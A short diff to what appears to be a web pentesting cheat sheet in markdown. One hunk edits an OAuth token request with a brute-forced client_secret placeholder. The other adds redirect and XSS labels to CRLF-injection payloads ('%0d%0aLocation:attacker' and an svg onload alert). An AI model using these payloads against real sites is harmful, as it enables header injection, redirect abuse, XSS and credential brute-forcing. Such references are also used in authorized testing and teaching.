@@ -609,7 +609,7 @@ POST /token
 Host: site.com
 Content-Type: application/x-www-form-urlencoded  
 
-client_id=\<client_id>&client_secret=\<BRUTE_FORCE>&redirect_uri=http%3A%2F%2Fip%2Fcallback&grant_type=authorization_code&code=<code>
+client_id=<client_id>&client_secret=<BRUTE_FORCE>&redirect_uri=http%3A%2F%2Fip%2Fcallback&grant_type=authorization_code&code=<code>
 ```  
 4-
 ```  
@@ -1137,8 +1137,11 @@ xhr.send(null);
 
 ## CRLF Injection
   
+-> Redirect  
 `/%0d%0aLocation:attacker`  
-`/%0d%0a%0d%0a\<svg onload=(0)>`
+
+-> XSS 
+`/%0d%0a%0d%0a<svg onload="alert(1)">`
 
 ## Elasticsearch - API
 
